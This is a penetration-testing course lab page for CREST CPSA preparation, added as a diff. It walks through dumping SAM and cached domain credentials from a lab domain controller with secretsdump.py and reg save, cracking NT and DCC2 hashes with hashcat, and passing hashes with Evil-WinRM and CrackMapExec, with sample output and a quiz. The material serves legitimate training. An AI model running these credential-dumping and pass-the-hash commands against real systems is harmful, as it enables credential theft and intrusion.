@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab E5-B: SAM Dump and Cached Domain Credentials | CPSA Module E | My Cyber Academy</title>
+<style>
+  :root { --mca-orange: #FF6B00; --mca-dark: #1a1a1a; --mca-grey: #2d2d2d; --mca-text: #e0e0e0; --mca-white: #ffffff; --mca-green: #4CAF50; --mca-red: #f44336; --mca-yellow: #FFC107; --mca-blue: #2196F3; --mca-code-bg: #0d1117; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--mca-dark); color: var(--mca-text); font-family: 'Segoe UI', Arial, sans-serif; font-size: 15px; line-height: 1.65; }
+  .lab-header { background: linear-gradient(135deg, #1a1a1a 0%, #2d1a00 100%); border-bottom: 3px solid var(--mca-orange); padding: 28px 32px 20px; }
+  .lab-header h1 { font-size: 26px; font-weight: 700; color: var(--mca-white); margin-bottom: 6px; }
+  .lab-header h1 span { color: var(--mca-orange); }
+  .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 12px; font-size: 13px; color: #aaa; }
+  .lab-meta .badge { background: var(--mca-grey); border: 1px solid #444; padding: 3px 10px; border-radius: 12px; font-size: 12px; }
+  .lab-meta .badge.orange { border-color: var(--mca-orange); color: var(--mca-orange); }
+  .container { max-width: 960px; margin: 0 auto; padding: 32px 24px; }
+  .chain-banner { background: #1a1a2e; border: 1px solid #2d3a5a; border-radius: 6px; padding: 16px 20px; margin-bottom: 24px; font-size: 13px; color: #9fa8da; }
+  .chain-banner strong { color: #c5cae9; }
+  .chain-steps { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; align-items: center; }
+  .chain-step { background: #222; border: 1px solid #333; border-radius: 4px; padding: 4px 10px; font-size: 12px; color: #888; }
+  .chain-step.done { border-color: #4CAF50; color: #4CAF50; }
+  .chain-step.active { background: #2d1a00; border-color: var(--mca-orange); color: var(--mca-orange); font-weight: 600; }
+  .chain-step.ahead { color: #555; border-color: #2a2a2a; }
+  .chain-arrow { color: #444; font-size: 14px; }
+  .scenario-box { background: var(--mca-grey); border-left: 4px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-bottom: 28px; }
+  .scenario-box h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-orange); margin-bottom: 10px; }
+  .scenario-box p { font-size: 14px; color: #ccc; }
+  .objectives { background: #1e2d1e; border: 1px solid #2d4a2d; border-radius: 4px; padding: 18px 24px; margin-bottom: 28px; }
+  .objectives h2 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--mca-green); margin-bottom: 12px; }
+  .objectives ul { list-style: none; }
+  .objectives ul li { padding: 4px 0; font-size: 14px; }
+  .objectives ul li::before { content: "✓ "; color: var(--mca-green); font-weight: bold; }
+  .env-table { width: 100%; border-collapse: collapse; margin-bottom: 28px; font-size: 13px; }
+  .env-table th { background: var(--mca-grey); color: var(--mca-orange); text-align: left; padding: 10px 14px; font-size: 12px; text-transform: uppercase; border-bottom: 2px solid var(--mca-orange); }
+  .env-table td { padding: 10px 14px; border-bottom: 1px solid #333; }
+  .env-table tr:nth-child(even) td { background: #222; }
+  .env-table code { background: var(--mca-code-bg); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; color: var(--mca-orange); font-size: 12px; }
+  .phase { margin-bottom: 36px; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
+  .phase-header { background: var(--mca-grey); padding: 14px 20px; display: flex; align-items: center; gap: 14px; border-bottom: 1px solid #444; }
+  .phase-num { background: var(--mca-orange); color: #000; font-weight: 700; font-size: 14px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .phase-header h3 { font-size: 16px; color: var(--mca-white); }
+  .phase-header .phase-tag { margin-left: auto; font-size: 11px; color: #888; background: #222; border: 1px solid #444; padding: 2px 8px; border-radius: 10px; text-transform: uppercase; }
+  .phase-body { padding: 20px 24px; }
+  .step { margin-bottom: 22px; }
+  .step p { font-size: 14px; color: #ccc; margin-bottom: 10px; }
+  .step strong { color: var(--mca-white); }
+  pre { background: var(--mca-code-bg); border: 1px solid #30363d; border-radius: 6px; padding: 16px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.6; margin: 10px 0; }
+  pre code { color: #e6edf3; }
+  pre .comment { color: #8b949e; }
+  pre .cmd { color: #79c0ff; }
+  pre .flag { color: #ffa657; }
+  pre .str { color: #a5d6ff; }
+  pre .out { color: #3fb950; }
+  pre .warn { color: #FFC107; }
+  .callout { border-radius: 4px; padding: 14px 18px; margin: 14px 0; font-size: 13px; display: flex; gap: 12px; align-items: flex-start; }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .callout.crest { background: #1a1f2e; border: 1px solid #2d3a5a; }
+  .callout.crest .callout-icon { color: #7986cb; }
+  .callout.crest strong { color: #9fa8da; }
+  .callout.warn { background: #2a1f00; border: 1px solid #5a3a00; }
+  .callout.warn .callout-icon { color: var(--mca-yellow); }
+  .callout.info { background: #0d1f2d; border: 1px solid #1a3a5a; }
+  .callout.info .callout-icon { color: var(--mca-blue); }
+  .hash-compare { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 16px 0; }
+  .hash-card { background: #1a1a1a; border: 1px solid #333; border-radius: 4px; padding: 14px 16px; }
+  .hash-card h4 { font-size: 12px; text-transform: uppercase; color: var(--mca-orange); margin-bottom: 8px; letter-spacing: 0.5px; }
+  .hash-card .mode { font-family: 'Courier New', monospace; color: var(--mca-yellow); font-size: 13px; margin-bottom: 6px; }
+  .hash-card p { font-size: 12px; color: #888; line-height: 1.5; }
+  .knowledge-check { background: #1a1a1a; border: 1px solid #444; border-radius: 6px; padding: 20px 24px; margin: 28px 0; }
+  .knowledge-check h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; }
+  .kc-question { margin-bottom: 20px; }
+  .kc-question p { font-size: 14px; margin-bottom: 10px; }
+  .options { display: flex; flex-direction: column; gap: 8px; }
+  .option { background: var(--mca-grey); border: 1px solid #444; border-radius: 4px; padding: 10px 14px; font-size: 13px; cursor: pointer; transition: border-color 0.2s; }
+  .option:hover { border-color: var(--mca-orange); }
+  .option.correct { background: #1e3a1e; border-color: var(--mca-green); color: #a5d6a7; }
+  .option.wrong { background: #3a1e1e; border-color: var(--mca-red); color: #ef9a9a; }
+  .reveal-btn { background: transparent; border: 1px solid var(--mca-orange); color: var(--mca-orange); padding: 7px 16px; border-radius: 4px; font-size: 12px; cursor: pointer; margin-top: 8px; }
+  .reveal-btn:hover { background: var(--mca-orange); color: #000; }
+  .kc-answer { display: none; background: #0d1f0d; border: 1px solid #2d4a2d; border-radius: 4px; padding: 12px 16px; margin-top: 10px; font-size: 13px; color: #a5d6a7; }
+  .kc-answer.show { display: block; }
+  .takeaways { background: var(--mca-grey); border-top: 3px solid var(--mca-orange); border-radius: 4px; padding: 20px 24px; margin-top: 32px; }
+  .takeaways h3 { color: var(--mca-orange); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 14px; }
+  .takeaways ul { list-style: none; }
+  .takeaways ul li { padding: 5px 0; font-size: 14px; color: #ccc; }
+  .takeaways ul li::before { content: "→ "; color: var(--mca-orange); }
+  .lab-footer { background: #111; border-top: 1px solid #333; padding: 18px 32px; text-align: center; font-size: 12px; color: #555; margin-top: 48px; }
+  .lab-footer span { color: var(--mca-orange); }
+  .nav-links { display: flex; justify-content: space-between; margin-top: 32px; }
+  .nav-link { background: var(--mca-grey); border: 1px solid #444; color: #aaa; padding: 10px 20px; border-radius: 4px; font-size: 13px; text-decoration: none; transition: border-color 0.2s; }
+  .nav-link:hover, .nav-link.next { border-color: var(--mca-orange); color: var(--mca-orange); }
+</style>
+</head>
+<body>
+
+<div class="lab-header">
+  <div class="lab-meta"><span style="font-size:12px;color:#888;text-transform:uppercase;letter-spacing:1px;">CPSA &rsaquo; Module E &rsaquo; Windows Security Assessment</span></div>
+  <h1><span>Lab E5-B:</span> SAM Dump and Cached Domain Credentials</h1>
+  <div class="lab-meta">
+    <span class="badge orange">Module E</span>
+    <span class="badge">Post-Exploitation</span>
+    <span class="badge">CREST CPSA</span>
+    <span class="badge">CPSA Ref: E5</span>
+    <span>Difficulty: Intermediate</span>
+    <span>Estimated time: 55 min</span>
+  </div>
+</div>
+
+<div class="container">
+
+  <div class="chain-banner">
+    <strong>Windows Attack Chain - Where You Are Now</strong>
+    <div class="chain-steps">
+      <span class="chain-step done">E0 Pre-flight</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E1-A SMB Enum</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E2-A Credential Access</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E3-A PrivEsc</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E3-B ACLs</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E4-A AD Enum</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E4-B Password Spray</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step done">E5-A Kerberos</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step active">E5-B SAM Dump</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E6-A SQL</span><span class="chain-arrow">&#8594;</span>
+      <span class="chain-step ahead">E7-A Patch Assessment</span>
+    </div>
+    <p style="margin-top:10px;font-size:12px;color:#7986cb;">You have SYSTEM on the DC from E3-A and a domain account from E5-A Kerberos attacks. This is the credential harvesting phase - dump the SAM database (local accounts), extract cached domain credentials (DCC2) from the registry, and crack them offline. These hashes may unlock accounts not reached by Kerberoasting and provide the cleartext passwords needed for lateral movement.</p>
+  </div>
+
+  <div class="scenario-box">
+    <h2>Engagement Scenario</h2>
+    <p>With SYSTEM on SYNTEX-DC01, your objective is to extract every password hash stored locally on the DC. The SAM database holds local account NT hashes. The registry holds up to 10 cached domain logon hashes (DCC2 format) for accounts that have logged on to this machine. Additionally, you will use <code>secretsdump.py</code> remotely - the same technique you would use from Kali if you had domain admin credentials but no interactive shell.</p>
+  </div>
+
+  <div class="objectives">
+    <h2>Learning Objectives</h2>
+    <ul>
+      <li>Understand the difference between SAM hashes (NT), cached credentials (DCC2), and NTDS.dit hashes</li>
+      <li>Use secretsdump.py to remotely extract SAM hashes with domain admin credentials</li>
+      <li>Extract cached domain credentials from the registry with reg save</li>
+      <li>Crack NT hashes (mode 1000) and DCC2 hashes (mode 2100) with Hashcat</li>
+      <li>Identify when to use Pass-the-Hash vs when cracking is required</li>
+    </ul>
+  </div>
+
+  <table class="env-table">
+    <thead><tr><th>Host</th><th>IP</th><th>Current Access</th><th>CPSA Ref</th></tr></thead>
+    <tbody>
+      <tr><td>SYNTEX-DC01</td><td><code>&lt;DC01-IP&gt;</code></td><td>SYSTEM (from E3-A) / Domain Admin (from E5-A)</td><td>E5 - SAM, DCC2, Post-exploitation credential harvest</td></tr>
+      <tr><td>Kali</td><td><code>&lt;KALI-IP&gt;</code></td><td>secretsdump.py with DA creds</td><td>Remote credential extraction</td></tr>
+    </tbody>
+  </table>
+
+  <!-- PHASE 1 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">1</div>
+      <h3>Hash Types - Know Before You Crack</h3>
+      <span class="phase-tag">Theory</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>Before dumping anything, understand what you are extracting and what you can do with each hash type:</p>
+        <div class="hash-compare">
+          <div class="hash-card">
+            <h4>NT Hash (NTLM)</h4>
+            <div class="mode">Hashcat: -m 1000</div>
+            <p>Stored in SAM (local accounts) and NTDS.dit (domain accounts). Can be passed directly with Evil-WinRM <code>-H</code> or CME <code>-H</code> without cracking. Format: 32 hex characters.</p>
+          </div>
+          <div class="hash-card">
+            <h4>DCC2 / msCachev2</h4>
+            <div class="mode">Hashcat: -m 2100</div>
+            <p>Cached domain credentials stored in registry at <code>HKLM\SECURITY\Cache</code>. Cannot be passed - must be cracked. Much slower to crack than NT. Format: <code>$DCC2$10240#username#hash</code>.</p>
+          </div>
+          <div class="hash-card">
+            <h4>NetNTLMv2</h4>
+            <div class="mode">Hashcat: -m 5600</div>
+            <p>Challenge-response hash captured by Responder (E2-A). Cannot be passed - must be cracked or relayed. Format: long string with username, challenge and response.</p>
+          </div>
+          <div class="hash-card">
+            <h4>Kerberos TGS ($krb5tgs)</h4>
+            <div class="mode">Hashcat: -m 13100</div>
+            <p>Kerberoasting output (E5-A). Cannot be passed - must be cracked. Encrypted with the service account's password hash. Format: $krb5tgs$23$...</p>
+          </div>
+        </div>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> This table is exam-critical. You must know which hash types can be passed and which must be cracked. NT hashes (from SAM/NTDS) are passable. DCC2, NetNTLMv2, and Kerberos TGS hashes cannot be passed - they must be cracked with Hashcat using the correct mode number. Learn all four mode numbers.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 2 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">2</div>
+      <h3>Remote SAM Dump with secretsdump.py</h3>
+      <span class="phase-tag">Impacket / Remote</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>If you have domain admin credentials (from Kerberoasting or password spray), you can dump SAM remotely from Kali without an interactive shell. This is a stealthy approach as it avoids dropping files on the target:</p>
+        <pre><code><span class="comment"># Remote SAM dump using secretsdump.py with domain admin creds</span>
+<span class="comment"># Replace svc-sql with whichever DA-equivalent account you cracked in E5-A</span>
+<span class="cmd">secretsdump.py</span> syntex.local/svc-sql:Password123@&lt;DC01-IP&gt;
+
+<span class="out">Impacket v0.12.0 - Copyright 2023 Fortra
+
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x3b4a9e8c1f2d5a7b3e6c...
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash):
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e4109f8977e9e7a5be9c87ae07c9e520:::
+
+[*] Dumping cached domain logon information (domain/username:hash):
+SYNTEX/jsmith:$DCC2$10240#jsmith#4b9de7b1bcc24c8e9ad64a3e29a8ac4b
+SYNTEX/mjones:$DCC2$10240#mjones#7c8e1a2b3d4f5e6a7b8c9d0e1f2a3b4c
+SYNTEX/hr.admin:$DCC2$10240#hr.admin#9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b
+
+[*] Stopping service RemoteRegistry</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Extract just the NT hashes into a file for cracking and Pass-the-Hash:</p>
+        <pre><code><span class="comment"># Save output to file and extract NT hashes</span>
+<span class="cmd">secretsdump.py</span> syntex.local/svc-sql:Password123@&lt;DC01-IP&gt; <span class="flag">-outputfile</span> syntex_sam
+
+<span class="comment"># Output files created:</span>
+<span class="out">syntex_sam.sam        - local SAM hashes
+syntex_sam.cached     - DCC2 cached credentials
+syntex_sam.secrets    - LSA secrets</span>
+
+<span class="comment"># Extract NT hash column (field 4) for cracking</span>
+<span class="cmd">cut</span> <span class="flag">-d:</span> <span class="flag">-f4</span> syntex_sam.sam &gt; nt_hashes.txt
+<span class="cmd">cat</span> nt_hashes.txt
+<span class="out">64f12cddaa88057e06a81b54e73b949b
+31d6cfe0d16ae931b73c59d7e0c089c0
+e4109f8977e9e7a5be9c87ae07c9e520</span>
+</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 3 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">3</div>
+      <h3>Manual Registry Extraction for Cached Creds</h3>
+      <span class="phase-tag">reg save / SYSTEM shell</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>If you have a SYSTEM shell but cannot use secretsdump remotely, extract the required registry hives manually and pull them to Kali for offline processing:</p>
+        <pre><code><span class="comment"># On SYNTEX-DC01 (SYSTEM shell) - save the three required hives</span>
+<span class="comment"># SAM hive - contains local user NT hashes</span>
+reg save HKLM\SAM C:\Windows\Temp\sam.hive
+<span class="comment"># SYSTEM hive - contains the boot key needed to decrypt SAM</span>
+reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
+<span class="comment"># SECURITY hive - contains cached domain credentials (DCC2)</span>
+reg save HKLM\SECURITY C:\Windows\Temp\security.hive
+
+<span class="out">The operation completed successfully.  (x3)</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Transfer the hives to Kali and process them with secretsdump.py in offline mode:</p>
+        <pre><code><span class="comment"># On Kali: retrieve the three hive files</span>
+<span class="comment"># (via Evil-WinRM download or SMB share)</span>
+<span class="cmd">evil-winrm</span> <span class="flag">-i</span> &lt;DC01-IP&gt; <span class="flag">-u</span> hr.admin <span class="flag">-p</span> Password1
+<span class="comment"># Evil-WinRM prompt:</span>
+download C:\Windows\Temp\sam.hive
+download C:\Windows\Temp\system.hive
+download C:\Windows\Temp\security.hive
+
+<span class="comment"># On Kali: process offline with secretsdump</span>
+<span class="cmd">secretsdump.py</span> <span class="flag">-sam</span> sam.hive <span class="flag">-system</span> system.hive <span class="flag">-security</span> security.hive LOCAL
+
+<span class="out">Impacket v0.12.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x3b4a9e8c1f2d5a7b...
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash):
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+
+[*] Dumping cached domain logon information:
+SYNTEX/jsmith:$DCC2$10240#jsmith#4b9de7b1bcc24c8e9ad64a3e29a8ac4b
+SYNTEX/mjones:$DCC2$10240#mjones#7c8e1a2b3d4f5e6a7b8c9d0e1f2a3b4c</span>
+</code></pre>
+      </div>
+      <div class="callout warn">
+        <span class="callout-icon">⚠</span>
+        <div><strong>Clean Up:</strong> Delete the hive files from C:\Windows\Temp after transferring them. Leaving registry hive dumps on the target is a significant operational security failure - they contain sensitive credential data and are easily found by incident responders. Document that you deleted them in your engagement notes.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PHASE 4 -->
+  <div class="phase">
+    <div class="phase-header">
+      <div class="phase-num">4</div>
+      <h3>Cracking NT Hashes and DCC2 with Hashcat</h3>
+      <span class="phase-tag">Hashcat</span>
+    </div>
+    <div class="phase-body">
+      <div class="step">
+        <p>NT hashes (mode 1000) crack very fast - many will crack instantly against rockyou.txt. DCC2 hashes (mode 2100) are significantly slower due to 10,240 PBKDF2 iterations:</p>
+        <pre><code><span class="comment"># Crack NT hashes - mode 1000 - very fast</span>
+<span class="cmd">hashcat</span> <span class="flag">-m</span> 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt <span class="flag">--force</span>
+
+<span class="out">64f12cddaa88057e06a81b54e73b949b:Password1
+31d6cfe0d16ae931b73c59d7e0c089c0:           &lt;-- empty password (disabled account)
+e4109f8977e9e7a5be9c87ae07c9e520:Syntex2024!</span>
+
+<span class="comment"># Crack DCC2 hashes - mode 2100 - MUCH slower</span>
+<span class="comment"># Save DCC2 hashes to a file first</span>
+<span class="cmd">cat</span> dcc2_hashes.txt
+<span class="out">$DCC2$10240#jsmith#4b9de7b1bcc24c8e9ad64a3e29a8ac4b
+$DCC2$10240#mjones#7c8e1a2b3d4f5e6a7b8c9d0e1f2a3b4c</span>
+
+<span class="cmd">hashcat</span> <span class="flag">-m</span> 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt <span class="flag">--force</span>
+
+<span class="out">$DCC2$10240#jsmith#4b9de7b1bcc24c8e9ad64a3e29a8ac4b:Welcome1
+<span class="warn"># DCC2 cracking is slow - use rules or targeted wordlists if rockyou stalls</span></span>
+
+<span class="comment"># Add rules to expand wordlist coverage</span>
+<span class="cmd">hashcat</span> <span class="flag">-m</span> 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt <span class="flag">-r</span> /usr/share/hashcat/rules/best64.rule <span class="flag">--force</span>
+</code></pre>
+      </div>
+      <div class="step">
+        <p>Pass NT hashes directly without cracking where possible - this avoids wasting time on complex passwords:</p>
+        <pre><code><span class="comment"># Pass-the-Hash with Evil-WinRM (-H flag for NT hash)</span>
+<span class="cmd">evil-winrm</span> <span class="flag">-i</span> &lt;DC01-IP&gt; <span class="flag">-u</span> Administrator <span class="flag">-H</span> 64f12cddaa88057e06a81b54e73b949b
+
+<span class="comment"># Pass-the-Hash with CrackMapExec</span>
+<span class="cmd">crackmapexec</span> smb &lt;DC01-IP&gt; <span class="flag">-u</span> Administrator <span class="flag">-H</span> 64f12cddaa88057e06a81b54e73b949b
+
+<span class="out">SMB    &lt;DC01-IP&gt;  445  SYNTEX-DC01  [+] syntex.local\Administrator:64f12cddaa88... (Pwn3d!)</span>
+
+<span class="comment"># Spray the NT hash across the subnet to find other machines where this account is admin</span>
+<span class="cmd">crackmapexec</span> smb 192.168.1.0/24 <span class="flag">-u</span> Administrator <span class="flag">-H</span> 64f12cddaa88057e06a81b54e73b949b
+
+<span class="warn"># Note: DCC2 hashes CANNOT be passed - they must be cracked first</span>
+</code></pre>
+      </div>
+      <div class="callout crest">
+        <span class="callout-icon">★</span>
+        <div><strong>CREST CPSA Exam Point:</strong> DCC2 (Domain Cached Credentials v2) are stored when a domain user logs onto a machine that cannot reach a DC, so Windows can still authenticate them locally. The default is 10 cached logons. They cannot be used for network authentication - they only allow local interactive logon when the DC is unreachable. This is different from NT hashes which can be passed over the network.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- KNOWLEDGE CHECK -->
+  <div class="knowledge-check">
+    <h3>Knowledge Check</h3>
+    <div class="kc-question" id="q1">
+      <p><strong>Q1.</strong> You extract a DCC2 hash from the registry. What can you do with it directly?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q1','a')">A. Pass it with Evil-WinRM using the -H flag to authenticate to the DC</div>
+        <div class="option" onclick="answer(this,'q1','b')">B. Use it with Mimikatz sekurlsa::pth to create a new token</div>
+        <div class="option" onclick="answer(this,'q1','c')">C. Crack it offline with Hashcat mode 2100 to recover the plaintext password</div>
+        <div class="option" onclick="answer(this,'q1','d')">D. Use it with secretsdump.py to dump NTDS.dit remotely</div>
+      </div>
+    </div>
+
+    <div class="kc-question" id="q2">
+      <p><strong>Q2.</strong> Why does extracting cached credentials require both the SAM, SYSTEM, and SECURITY hives?</p>
+      <button class="reveal-btn" onclick="reveal('a2')">Reveal Answer</button>
+      <div class="kc-answer" id="a2">The SYSTEM hive contains the boot key (syskey), which is used to encrypt the SAM and SECURITY hives. Without the boot key from SYSTEM, the hashes in SAM and SECURITY are encrypted and unreadable. secretsdump.py (and Mimikatz) decrypt the hashes using: boot key from SYSTEM, then hashed boot key from SAM, then the actual hashes. All three hives are always required for offline processing.</div>
+    </div>
+
+    <div class="kc-question" id="q3">
+      <p><strong>Q3.</strong> What Hashcat mode cracks NT hashes from the SAM database?</p>
+      <div class="options">
+        <div class="option" onclick="answer(this,'q3','a')">A. 5600 (NetNTLMv2)</div>
+        <div class="option" onclick="answer(this,'q3','b')">B. 13100 (Kerberoasting)</div>
+        <div class="option" onclick="answer(this,'q3','c')">C. 2100 (DCC2)</div>
+        <div class="option" onclick="answer(this,'q3','d')">D. 1000 (NTLM/NT)</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="takeaways">
+    <h3>Key Takeaways</h3>
+    <ul>
+      <li>NT hashes (SAM/NTDS) can be passed directly - no cracking required for lateral movement</li>
+      <li>DCC2 hashes cannot be passed over the network - they must be cracked with Hashcat mode 2100</li>
+      <li>secretsdump.py works both remotely (with creds) and offline (with hive files)</li>
+      <li>Always extract SAM, SYSTEM, and SECURITY together - secretsdump needs all three</li>
+      <li>Delete hive files from the target immediately after transfer - they are high-value artefacts</li>
+      <li>DCC2 cracking is slow - prioritise NT hash passing and targeted wordlists over brute force</li>
+    </ul>
+  </div>
+
+  <div class="nav-links">
+    <a href="lab-e5a-kerberos-attacks-v1.html" class="nav-link">&larr; Lab E5-A: Kerberos Attacks</a>
+    <a href="lab-e6a-sql-exploitation-v1.html" class="nav-link next">Next: Lab E6-A - SQL Server Exploitation &rarr;</a>
+  </div>
+
+</div>
+
+<div class="lab-footer">
+  <span>My Cyber Academy</span> &nbsp;|&nbsp; CREST CPSA Preparation &nbsp;|&nbsp; Module E: Windows Security Assessment<br>
+  Lab E5-B: SAM Dump and Cached Domain Credentials &nbsp;|&nbsp; &copy; 2024 My Cyber Academy Ltd &nbsp;|&nbsp; All rights reserved
+</div>
+
+<script>
+const correctAnswers = { q1: 'c', q3: 'd' };
+function answer(el, qid, choice) {
+  const opts = document.querySelectorAll('#' + qid + ' .option');
+  opts.forEach(o => { o.classList.remove('correct','wrong'); o.style.pointerEvents='none'; });
+  el.classList.add(choice === correctAnswers[qid] ? 'correct' : 'wrong');
+  if (choice !== correctAnswers[qid]) {
+    opts.forEach(o => { if (o.textContent.trim().startsWith(correctAnswers[qid].toUpperCase() + '.')) o.classList.add('correct'); });
+  }
+}
+function reveal(id) { document.getElementById(id).classList.add('show'); event.target.style.display='none'; }
+</script>
+</body>
+</html>
